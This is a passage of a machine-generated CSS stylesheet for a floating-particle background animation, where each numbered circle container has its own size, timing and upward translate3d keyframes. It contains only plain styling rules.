    -webkit-transform: translate3d(51vw, -122vh, 0);
            transform: translate3d(51vw, -122vh, 0);
  }
}
@keyframes move-frames-165 {
  from {
    -webkit-transform: translate3d(75vw, 107vh, 0);
            transform: translate3d(75vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(51vw, -122vh, 0);
            transform: translate3d(51vw, -122vh, 0);
  }
}
.circle-container:nth-child(165) .circle {
  -webkit-animation-delay: 2689ms;
          animation-delay: 2689ms;
}
.circle-container:nth-child(166) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-166;
          animation-name: move-frames-166;
  -webkit-animation-duration: 35535ms;
          animation-duration: 35535ms;
  -webkit-animation-delay: 420ms;
          animation-delay: 420ms;
}
@-webkit-keyframes move-frames-166 {
  from {
    -webkit-transform: translate3d(98vw, 109vh, 0);
            transform: translate3d(98vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(89vw, -118vh, 0);
            transform: translate3d(89vw, -118vh, 0);
  }
}
@keyframes move-frames-166 {
  from {
    -webkit-transform: translate3d(98vw, 109vh, 0);
            transform: translate3d(98vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(89vw, -118vh, 0);
            transform: translate3d(89vw, -118vh, 0);
  }
}
.circle-container:nth-child(166) .circle {
  -webkit-animation-delay: 3451ms;
          animation-delay: 3451ms;
}
.circle-container:nth-child(167) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-167;
          animation-name: move-frames-167;
  -webkit-animation-duration: 36838ms;
          animation-duration: 36838ms;
  -webkit-animation-delay: 21105ms;
          animation-delay: 21105ms;
}
@-webkit-keyframes move-frames-167 {
  from {
    -webkit-transform: translate3d(26vw, 110vh, 0);
            transform: translate3d(26vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -123vh, 0);
            transform: translate3d(60vw, -123vh, 0);
  }
}
@keyframes move-frames-167 {
  from {
    -webkit-transform: translate3d(26vw, 110vh, 0);
            transform: translate3d(26vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -123vh, 0);
            transform: translate3d(60vw, -123vh, 0);
  }
}
.circle-container:nth-child(167) .circle {
  -webkit-animation-delay: 956ms;
          animation-delay: 956ms;
}
.circle-container:nth-child(168) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-168;
          animation-name: move-frames-168;
  -webkit-animation-duration: 35978ms;
          animation-duration: 35978ms;
  -webkit-animation-delay: 5795ms;
          animation-delay: 5795ms;
}
@-webkit-keyframes move-frames-168 {
  from {
    -webkit-transform: translate3d(56vw, 110vh, 0);
            transform: translate3d(56vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(78vw, -133vh, 0);
            transform: translate3d(78vw, -133vh, 0);
  }
}
@keyframes move-frames-168 {
  from {
    -webkit-transform: translate3d(56vw, 110vh, 0);
            transform: translate3d(56vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(78vw, -133vh, 0);
            transform: translate3d(78vw, -133vh, 0);
  }
}
.circle-container:nth-child(168) .circle {
  -webkit-animation-delay: 3390ms;
          animation-delay: 3390ms;
}
.circle-container:nth-child(169) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-169;
          animation-name: move-frames-169;
  -webkit-animation-duration: 30915ms;
          animation-duration: 30915ms;
  -webkit-animation-delay: 20045ms;
          animation-delay: 20045ms;
}
@-webkit-keyframes move-frames-169 {
  from {
    -webkit-transform: translate3d(88vw, 102vh, 0);
            transform: translate3d(88vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(66vw, -118vh, 0);
            transform: translate3d(66vw, -118vh, 0);
  }
}
@keyframes move-frames-169 {
  from {
    -webkit-transform: translate3d(88vw, 102vh, 0);
            transform: translate3d(88vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(66vw, -118vh, 0);
            transform: translate3d(66vw, -118vh, 0);
  }
}
.circle-container:nth-child(169) .circle {
  -webkit-animation-delay: 1146ms;
          animation-delay: 1146ms;
}
.circle-container:nth-child(170) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-170;
          animation-name: move-frames-170;
  -webkit-animation-duration: 35860ms;
          animation-duration: 35860ms;
  -webkit-animation-delay: 2142ms;
          animation-delay: 2142ms;
}
@-webkit-keyframes move-frames-170 {
  from {
    -webkit-transform: translate3d(45vw, 109vh, 0);
            transform: translate3d(45vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(42vw, -122vh, 0);
            transform: translate3d(42vw, -122vh, 0);
  }
}
@keyframes move-frames-170 {
  from {
    -webkit-transform: translate3d(45vw, 109vh, 0);
            transform: translate3d(45vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(42vw, -122vh, 0);
            transform: translate3d(42vw, -122vh, 0);
  }
}
.circle-container:nth-child(170) .circle {
  -webkit-animation-delay: 1658ms;
          animation-delay: 1658ms;
}
.circle-container:nth-child(171) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-171;
          animation-name: move-frames-171;
  -webkit-animation-duration: 29264ms;
          animation-duration: 29264ms;
  -webkit-animation-delay: 11703ms;
          animation-delay: 11703ms;
}
@-webkit-keyframes move-frames-171 {
  from {
    -webkit-transform: translate3d(2vw, 109vh, 0);
            transform: translate3d(2vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(2vw, -125vh, 0);
            transform: translate3d(2vw, -125vh, 0);
  }
}
@keyframes move-frames-171 {
  from {
    -webkit-transform: translate3d(2vw, 109vh, 0);
            transform: translate3d(2vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(2vw, -125vh, 0);
            transform: translate3d(2vw, -125vh, 0);
  }
}
.circle-container:nth-child(171) .circle {
  -webkit-animation-delay: 1092ms;
          animation-delay: 1092ms;
}
.circle-container:nth-child(172) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-172;
          animation-name: move-frames-172;
  -webkit-animation-duration: 35130ms;
          animation-duration: 35130ms;
  -webkit-animation-delay: 10109ms;
          animation-delay: 10109ms;
}
@-webkit-keyframes move-frames-172 {
  from {
    -webkit-transform: translate3d(31vw, 110vh, 0);
            transform: translate3d(31vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -125vh, 0);
            transform: translate3d(24vw, -125vh, 0);
  }
}
@keyframes move-frames-172 {
  from {
    -webkit-transform: translate3d(31vw, 110vh, 0);
            transform: translate3d(31vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -125vh, 0);
            transform: translate3d(24vw, -125vh, 0);
  }
}
.circle-container:nth-child(172) .circle {
  -webkit-animation-delay: 3851ms;
          animation-delay: 3851ms;
}
.circle-container:nth-child(173) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-173;
          animation-name: move-frames-173;
  -webkit-animation-duration: 35952ms;
          animation-duration: 35952ms;
  -webkit-animation-delay: 31783ms;
          animation-delay: 31783ms;
}
@-webkit-keyframes move-frames-173 {
  from {
    -webkit-transform: translate3d(37vw, 101vh, 0);
            transform: translate3d(37vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(74vw, -119vh, 0);
            transform: translate3d(74vw, -119vh, 0);
  }
}
@keyframes move-frames-173 {
  from {
    -webkit-transform: translate3d(37vw, 101vh, 0);
            transform: translate3d(37vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(74vw, -119vh, 0);
            transform: translate3d(74vw, -119vh, 0);
  }
}
.circle-container:nth-child(173) .circle {
  -webkit-animation-delay: 635ms;
          animation-delay: 635ms;
}
.circle-container:nth-child(174) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-174;
          animation-name: move-frames-174;
  -webkit-animation-duration: 36759ms;
          animation-duration: 36759ms;
  -webkit-animation-delay: 23171ms;
          animation-delay: 23171ms;
}
@-webkit-keyframes move-frames-174 {
  from {
    -webkit-transform: translate3d(82vw, 110vh, 0);
            transform: translate3d(82vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -139vh, 0);
            transform: translate3d(24vw, -139vh, 0);
  }
}
@keyframes move-frames-174 {
  from {
    -webkit-transform: translate3d(82vw, 110vh, 0);
            transform: translate3d(82vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -139vh, 0);
            transform: translate3d(24vw, -139vh, 0);
  }
}
.circle-container:nth-child(174) .circle {
  -webkit-animation-delay: 3845ms;
          animation-delay: 3845ms;
}
.circle-container:nth-child(175) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-175;
          animation-name: move-frames-175;
  -webkit-animation-duration: 34802ms;
          animation-duration: 34802ms;
  -webkit-animation-delay: 15934ms;
          animation-delay: 15934ms;
}
@-webkit-keyframes move-frames-175 {
  from {
    -webkit-transform: translate3d(36vw, 110vh, 0);
            transform: translate3d(36vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -137vh, 0);
            transform: translate3d(24vw, -137vh, 0);
  }
}
@keyframes move-frames-175 {
  from {
    -webkit-transform: translate3d(36vw, 110vh, 0);
            transform: translate3d(36vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(24vw, -137vh, 0);
            transform: translate3d(24vw, -137vh, 0);
  }
}
.circle-container:nth-child(175) .circle {
  -webkit-animation-delay: 685ms;
          animation-delay: 685ms;
}
.circle-container:nth-child(176) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-176;
          animation-name: move-frames-176;
  -webkit-animation-duration: 31224ms;
          animation-duration: 31224ms;
  -webkit-animation-delay: 18531ms;
          animation-delay: 18531ms;
}
@-webkit-keyframes move-frames-176 {
  from {
    -webkit-transform: translate3d(72vw, 103vh, 0);
            transform: translate3d(72vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -116vh, 0);
            transform: translate3d(32vw, -116vh, 0);
  }
}
@keyframes move-frames-176 {
  from {
    -webkit-transform: translate3d(72vw, 103vh, 0);
            transform: translate3d(72vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -116vh, 0);
            transform: translate3d(32vw, -116vh, 0);
  }
}
.circle-container:nth-child(176) .circle {
  -webkit-animation-delay: 3288ms;
          animation-delay: 3288ms;
}
.circle-container:nth-child(177) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-177;
          animation-name: move-frames-177;
  -webkit-animation-duration: 33419ms;
          animation-duration: 33419ms;
  -webkit-animation-delay: 36617ms;
          animation-delay: 36617ms;
}
@-webkit-keyframes move-frames-177 {
  from {
    -webkit-transform: translate3d(75vw, 106vh, 0);
            transform: translate3d(75vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -120vh, 0);
            transform: translate3d(60vw, -120vh, 0);
  }
}
@keyframes move-frames-177 {
  from {
    -webkit-transform: translate3d(75vw, 106vh, 0);
            transform: translate3d(75vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(60vw, -120vh, 0);
            transform: translate3d(60vw, -120vh, 0);
  }
}
.circle-container:nth-child(177) .circle {
  -webkit-animation-delay: 1285ms;
          animation-delay: 1285ms;
}
.circle-container:nth-child(178) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-178;
          animation-name: move-frames-178;
  -webkit-animation-duration: 33586ms;
          animation-duration: 33586ms;
  -webkit-animation-delay: 27978ms;
          animation-delay: 27978ms;
}
@-webkit-keyframes move-frames-178 {
  from {
    -webkit-transform: translate3d(60vw, 108vh, 0);
            transform: translate3d(60vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -133vh, 0);
            transform: translate3d(6vw, -133vh, 0);
  }
}
@keyframes move-frames-178 {
  from {
    -webkit-transform: translate3d(60vw, 108vh, 0);
            transform: translate3d(60vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(6vw, -133vh, 0);
            transform: translate3d(6vw, -133vh, 0);
  }
}
.circle-container:nth-child(178) .circle {
  -webkit-animation-delay: 3029ms;
          animation-delay: 3029ms;
}
.circle-container:nth-child(179) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-179;
          animation-name: move-frames-179;
  -webkit-animation-duration: 33026ms;
          animation-duration: 33026ms;
  -webkit-animation-delay: 1310ms;
          animation-delay: 1310ms;
}
@-webkit-keyframes move-frames-179 {
  from {
    -webkit-transform: translate3d(57vw, 107vh, 0);
            transform: translate3d(57vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(77vw, -120vh, 0);
            transform: translate3d(77vw, -120vh, 0);
  }
}
@keyframes move-frames-179 {
  from {
    -webkit-transform: translate3d(57vw, 107vh, 0);
            transform: translate3d(57vw, 107vh, 0);
  }
  to {
    -webkit-transform: translate3d(77vw, -120vh, 0);
            transform: translate3d(77vw, -120vh, 0);
  }
}
.circle-container:nth-child(179) .circle {
  -webkit-animation-delay: 1919ms;
          animation-delay: 1919ms;
}
.circle-container:nth-child(180) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-180;
          animation-name: move-frames-180;
  -webkit-animation-duration: 32450ms;
          animation-duration: 32450ms;
  -webkit-animation-delay: 1361ms;
          animation-delay: 1361ms;
}
@-webkit-keyframes move-frames-180 {
  from {
    -webkit-transform: translate3d(72vw, 104vh, 0);
            transform: translate3d(72vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(91vw, -134vh, 0);
            transform: translate3d(91vw, -134vh, 0);
  }
}
@keyframes move-frames-180 {
  from {
    -webkit-transform: translate3d(72vw, 104vh, 0);
            transform: translate3d(72vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(91vw, -134vh, 0);
            transform: translate3d(91vw, -134vh, 0);
  }
}
.circle-container:nth-child(180) .circle {
  -webkit-animation-delay: 416ms;
          animation-delay: 416ms;
}
.circle-container:nth-child(181) {
  width: 7px;
  height: 7px;
  -webkit-animation-name: move-frames-181;
          animation-name: move-frames-181;
  -webkit-animation-duration: 36003ms;
          animation-duration: 36003ms;
  -webkit-animation-delay: 31337ms;
          animation-delay: 31337ms;
}
@-webkit-keyframes move-frames-181 {
  from {
    -webkit-transform: translate3d(17vw, 108vh, 0);
            transform: translate3d(17vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -136vh, 0);
            transform: translate3d(36vw, -136vh, 0);
  }
}
@keyframes move-frames-181 {
  from {
    -webkit-transform: translate3d(17vw, 108vh, 0);
            transform: translate3d(17vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(36vw, -136vh, 0);
            transform: translate3d(36vw, -136vh, 0);
  }
}
.circle-container:nth-child(181) .circle {
  -webkit-animation-delay: 3669ms;
          animation-delay: 3669ms;
}
.circle-container:nth-child(182) {
  width: 5px;
  height: 5px;
  -webkit-animation-name: move-frames-182;
          animation-name: move-frames-182;
  -webkit-animation-duration: 35797ms;
          animation-duration: 35797ms;
  -webkit-animation-delay: 17600ms;
          animation-delay: 17600ms;
}
@-webkit-keyframes move-frames-182 {
  from {
    -webkit-transform: translate3d(48vw, 105vh, 0);
            transform: translate3d(48vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -135vh, 0);
            transform: translate3d(13vw, -135vh, 0);
  }
}
@keyframes move-frames-182 {
  from {
    -webkit-transform: translate3d(48vw, 105vh, 0);
            transform: translate3d(48vw, 105vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -135vh, 0);
            transform: translate3d(13vw, -135vh, 0);
  }
}
.circle-container:nth-child(182) .circle {
  -webkit-animation-delay: 1039ms;
          animation-delay: 1039ms;
}
.circle-container:nth-child(183) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-183;
          animation-name: move-frames-183;
  -webkit-animation-duration: 33432ms;
          animation-duration: 33432ms;
  -webkit-animation-delay: 1183ms;
          animation-delay: 1183ms;
}
@-webkit-keyframes move-frames-183 {
  from {
    -webkit-transform: translate3d(9vw, 104vh, 0);
            transform: translate3d(9vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -105vh, 0);
            transform: translate3d(95vw, -105vh, 0);
  }
}
@keyframes move-frames-183 {
  from {
    -webkit-transform: translate3d(9vw, 104vh, 0);
            transform: translate3d(9vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(95vw, -105vh, 0);
            transform: translate3d(95vw, -105vh, 0);
  }
}
.circle-container:nth-child(183) .circle {
  -webkit-animation-delay: 2366ms;
          animation-delay: 2366ms;
}
.circle-container:nth-child(184) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-184;
          animation-name: move-frames-184;
  -webkit-animation-duration: 34135ms;
          animation-duration: 34135ms;
  -webkit-animation-delay: 33768ms;
          animation-delay: 33768ms;
}
@-webkit-keyframes move-frames-184 {
  from {
    -webkit-transform: translate3d(77vw, 102vh, 0);
            transform: translate3d(77vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -117vh, 0);
            transform: translate3d(81vw, -117vh, 0);
  }
}
@keyframes move-frames-184 {
  from {
    -webkit-transform: translate3d(77vw, 102vh, 0);
            transform: translate3d(77vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(81vw, -117vh, 0);
            transform: translate3d(81vw, -117vh, 0);
  }
}
.circle-container:nth-child(184) .circle {
  -webkit-animation-delay: 343ms;
          animation-delay: 343ms;
}
.circle-container:nth-child(185) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-185;
          animation-name: move-frames-185;
  -webkit-animation-duration: 29699ms;
          animation-duration: 29699ms;
  -webkit-animation-delay: 27517ms;
          animation-delay: 27517ms;
}
@-webkit-keyframes move-frames-185 {
  from {
    -webkit-transform: translate3d(2vw, 102vh, 0);
            transform: translate3d(2vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -111vh, 0);
            transform: translate3d(32vw, -111vh, 0);
  }
}
@keyframes move-frames-185 {
  from {
    -webkit-transform: translate3d(2vw, 102vh, 0);
            transform: translate3d(2vw, 102vh, 0);
  }
  to {
    -webkit-transform: translate3d(32vw, -111vh, 0);
            transform: translate3d(32vw, -111vh, 0);
  }
}
.circle-container:nth-child(185) .circle {
  -webkit-animation-delay: 394ms;
          animation-delay: 394ms;
}
.circle-container:nth-child(186) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-186;
          animation-name: move-frames-186;
  -webkit-animation-duration: 29964ms;
          animation-duration: 29964ms;
  -webkit-animation-delay: 952ms;
          animation-delay: 952ms;
}
@-webkit-keyframes move-frames-186 {
  from {
    -webkit-transform: translate3d(86vw, 103vh, 0);
            transform: translate3d(86vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(54vw, -132vh, 0);
            transform: translate3d(54vw, -132vh, 0);
  }
}
@keyframes move-frames-186 {
  from {
    -webkit-transform: translate3d(86vw, 103vh, 0);
            transform: translate3d(86vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(54vw, -132vh, 0);
            transform: translate3d(54vw, -132vh, 0);
  }
}
.circle-container:nth-child(186) .circle {
  -webkit-animation-delay: 821ms;
          animation-delay: 821ms;
}
.circle-container:nth-child(187) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-187;
          animation-name: move-frames-187;
  -webkit-animation-duration: 33754ms;
          animation-duration: 33754ms;
  -webkit-animation-delay: 29187ms;
          animation-delay: 29187ms;
}
@-webkit-keyframes move-frames-187 {
  from {
    -webkit-transform: translate3d(98vw, 103vh, 0);
            transform: translate3d(98vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(77vw, -109vh, 0);
            transform: translate3d(77vw, -109vh, 0);
  }
}
@keyframes move-frames-187 {
  from {
    -webkit-transform: translate3d(98vw, 103vh, 0);
            transform: translate3d(98vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(77vw, -109vh, 0);
            transform: translate3d(77vw, -109vh, 0);
  }
}
.circle-container:nth-child(187) .circle {
  -webkit-animation-delay: 1309ms;
          animation-delay: 1309ms;
}
.circle-container:nth-child(188) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-188;
          animation-name: move-frames-188;
  -webkit-animation-duration: 30752ms;
          animation-duration: 30752ms;
  -webkit-animation-delay: 17148ms;
          animation-delay: 17148ms;
}
@-webkit-keyframes move-frames-188 {
  from {
    -webkit-transform: translate3d(36vw, 104vh, 0);
            transform: translate3d(36vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(23vw, -112vh, 0);
            transform: translate3d(23vw, -112vh, 0);
  }
}
@keyframes move-frames-188 {
  from {
    -webkit-transform: translate3d(36vw, 104vh, 0);
            transform: translate3d(36vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(23vw, -112vh, 0);
            transform: translate3d(23vw, -112vh, 0);
  }
}
.circle-container:nth-child(188) .circle {
  -webkit-animation-delay: 1081ms;
          animation-delay: 1081ms;
}
.circle-container:nth-child(189) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-189;
          animation-name: move-frames-189;
  -webkit-animation-duration: 31942ms;
          animation-duration: 31942ms;
  -webkit-animation-delay: 2351ms;
          animation-delay: 2351ms;
}
@-webkit-keyframes move-frames-189 {
  from {
    -webkit-transform: translate3d(34vw, 110vh, 0);
            transform: translate3d(34vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -131vh, 0);
            transform: translate3d(69vw, -131vh, 0);
  }
}
@keyframes move-frames-189 {
  from {
    -webkit-transform: translate3d(34vw, 110vh, 0);
            transform: translate3d(34vw, 110vh, 0);
  }
  to {
    -webkit-transform: translate3d(69vw, -131vh, 0);
            transform: translate3d(69vw, -131vh, 0);
  }
}
.circle-container:nth-child(189) .circle {
  -webkit-animation-delay: 1380ms;
          animation-delay: 1380ms;
}
.circle-container:nth-child(190) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-190;
          animation-name: move-frames-190;
  -webkit-animation-duration: 29323ms;
          animation-duration: 29323ms;
  -webkit-animation-delay: 31013ms;
          animation-delay: 31013ms;
}
@-webkit-keyframes move-frames-190 {
  from {
    -webkit-transform: translate3d(77vw, 103vh, 0);
            transform: translate3d(77vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(78vw, -107vh, 0);
            transform: translate3d(78vw, -107vh, 0);
  }
}
@keyframes move-frames-190 {
  from {
    -webkit-transform: translate3d(77vw, 103vh, 0);
            transform: translate3d(77vw, 103vh, 0);
  }
  to {
    -webkit-transform: translate3d(78vw, -107vh, 0);
            transform: translate3d(78vw, -107vh, 0);
  }
}
.circle-container:nth-child(190) .circle {
  -webkit-animation-delay: 1309ms;
          animation-delay: 1309ms;
}
.circle-container:nth-child(191) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-191;
          animation-name: move-frames-191;
  -webkit-animation-duration: 36607ms;
          animation-duration: 36607ms;
  -webkit-animation-delay: 1738ms;
          animation-delay: 1738ms;
}
@-webkit-keyframes move-frames-191 {
  from {
    -webkit-transform: translate3d(69vw, 101vh, 0);
            transform: translate3d(69vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(59vw, -109vh, 0);
            transform: translate3d(59vw, -109vh, 0);
  }
}
@keyframes move-frames-191 {
  from {
    -webkit-transform: translate3d(69vw, 101vh, 0);
            transform: translate3d(69vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(59vw, -109vh, 0);
            transform: translate3d(59vw, -109vh, 0);
  }
}
.circle-container:nth-child(191) .circle {
  -webkit-animation-delay: 879ms;
          animation-delay: 879ms;
}
.circle-container:nth-child(192) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-192;
          animation-name: move-frames-192;
  -webkit-animation-duration: 35778ms;
          animation-duration: 35778ms;
  -webkit-animation-delay: 24510ms;
          animation-delay: 24510ms;
}
@-webkit-keyframes move-frames-192 {
  from {
    -webkit-transform: translate3d(74vw, 109vh, 0);
            transform: translate3d(74vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -114vh, 0);
            transform: translate3d(38vw, -114vh, 0);
  }
}
@keyframes move-frames-192 {
  from {
    -webkit-transform: translate3d(74vw, 109vh, 0);
            transform: translate3d(74vw, 109vh, 0);
  }
  to {
    -webkit-transform: translate3d(38vw, -114vh, 0);
            transform: translate3d(38vw, -114vh, 0);
  }
}
.circle-container:nth-child(192) .circle {
  -webkit-animation-delay: 3463ms;
          animation-delay: 3463ms;
}
.circle-container:nth-child(193) {
  width: 8px;
  height: 8px;
  -webkit-animation-name: move-frames-193;
          animation-name: move-frames-193;
  -webkit-animation-duration: 32464ms;
          animation-duration: 32464ms;
  -webkit-animation-delay: 1508ms;
          animation-delay: 1508ms;
}
@-webkit-keyframes move-frames-193 {
  from {
    -webkit-transform: translate3d(61vw, 108vh, 0);
            transform: translate3d(61vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -126vh, 0);
            transform: translate3d(14vw, -126vh, 0);
  }
}
@keyframes move-frames-193 {
  from {
    -webkit-transform: translate3d(61vw, 108vh, 0);
            transform: translate3d(61vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(14vw, -126vh, 0);
            transform: translate3d(14vw, -126vh, 0);
  }
}
.circle-container:nth-child(193) .circle {
  -webkit-animation-delay: 2107ms;
          animation-delay: 2107ms;
}
.circle-container:nth-child(194) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-194;
          animation-name: move-frames-194;
  -webkit-animation-duration: 35390ms;
          animation-duration: 35390ms;
  -webkit-animation-delay: 19301ms;
          animation-delay: 19301ms;
}
@-webkit-keyframes move-frames-194 {
  from {
    -webkit-transform: translate3d(20vw, 104vh, 0);
            transform: translate3d(20vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -113vh, 0);
            transform: translate3d(37vw, -113vh, 0);
  }
}
@keyframes move-frames-194 {
  from {
    -webkit-transform: translate3d(20vw, 104vh, 0);
            transform: translate3d(20vw, 104vh, 0);
  }
  to {
    -webkit-transform: translate3d(37vw, -113vh, 0);
            transform: translate3d(37vw, -113vh, 0);
  }
}
.circle-container:nth-child(194) .circle {
  -webkit-animation-delay: 146ms;
          animation-delay: 146ms;
}
.circle-container:nth-child(195) {
  width: 3px;
  height: 3px;
  -webkit-animation-name: move-frames-195;
          animation-name: move-frames-195;
  -webkit-animation-duration: 35694ms;
          animation-duration: 35694ms;
  -webkit-animation-delay: 10284ms;
          animation-delay: 10284ms;
}
@-webkit-keyframes move-frames-195 {
  from {
    -webkit-transform: translate3d(62vw, 106vh, 0);
            transform: translate3d(62vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(10vw, -112vh, 0);
            transform: translate3d(10vw, -112vh, 0);
  }
}
@keyframes move-frames-195 {
  from {
    -webkit-transform: translate3d(62vw, 106vh, 0);
            transform: translate3d(62vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(10vw, -112vh, 0);
            transform: translate3d(10vw, -112vh, 0);
  }
}
.circle-container:nth-child(195) .circle {
  -webkit-animation-delay: 698ms;
          animation-delay: 698ms;
}
.circle-container:nth-child(196) {
  width: 6px;
  height: 6px;
  -webkit-animation-name: move-frames-196;
          animation-name: move-frames-196;
  -webkit-animation-duration: 29132ms;
          animation-duration: 29132ms;
  -webkit-animation-delay: 4681ms;
          animation-delay: 4681ms;
}
@-webkit-keyframes move-frames-196 {
  from {
    -webkit-transform: translate3d(17vw, 106vh, 0);
            transform: translate3d(17vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -110vh, 0);
            transform: translate3d(13vw, -110vh, 0);
  }
}
@keyframes move-frames-196 {
  from {
    -webkit-transform: translate3d(17vw, 106vh, 0);
            transform: translate3d(17vw, 106vh, 0);
  }
  to {
    -webkit-transform: translate3d(13vw, -110vh, 0);
            transform: translate3d(13vw, -110vh, 0);
  }
}
.circle-container:nth-child(196) .circle {
  -webkit-animation-delay: 1138ms;
          animation-delay: 1138ms;
}
.circle-container:nth-child(197) {
  width: 1px;
  height: 1px;
  -webkit-animation-name: move-frames-197;
          animation-name: move-frames-197;
  -webkit-animation-duration: 34061ms;
          animation-duration: 34061ms;
  -webkit-animation-delay: 29318ms;
          animation-delay: 29318ms;
}
@-webkit-keyframes move-frames-197 {
  from {
    -webkit-transform: translate3d(33vw, 108vh, 0);
            transform: translate3d(33vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(74vw, -121vh, 0);
            transform: translate3d(74vw, -121vh, 0);
  }
}
@keyframes move-frames-197 {
  from {
    -webkit-transform: translate3d(33vw, 108vh, 0);
            transform: translate3d(33vw, 108vh, 0);
  }
  to {
    -webkit-transform: translate3d(74vw, -121vh, 0);
            transform: translate3d(74vw, -121vh, 0);
  }
}
.circle-container:nth-child(197) .circle {
  -webkit-animation-delay: 799ms;
          animation-delay: 799ms;
}
.circle-container:nth-child(198) {
  width: 4px;
  height: 4px;
  -webkit-animation-name: move-frames-198;
          animation-name: move-frames-198;
  -webkit-animation-duration: 33099ms;
          animation-duration: 33099ms;
  -webkit-animation-delay: 28337ms;
          animation-delay: 28337ms;
}
@-webkit-keyframes move-frames-198 {
  from {
    -webkit-transform: translate3d(65vw, 101vh, 0);
            transform: translate3d(65vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(43vw, -122vh, 0);
            transform: translate3d(43vw, -122vh, 0);
  }
}
@keyframes move-frames-198 {
  from {
    -webkit-transform: translate3d(65vw, 101vh, 0);
            transform: translate3d(65vw, 101vh, 0);
  }
  to {
    -webkit-transform: translate3d(43vw, -122vh, 0);
            transform: translate3d(43vw, -122vh, 0);
  }
}
.circle-container:nth-child(198) .circle {
  -webkit-animation-delay: 2300ms;
          animation-delay: 2300ms;
}
.circle-container:nth-child(199) {
  width: 2px;
  height: 2px;
  -webkit-animation-name: move-frames-199;
          animation-name: move-frames-199;
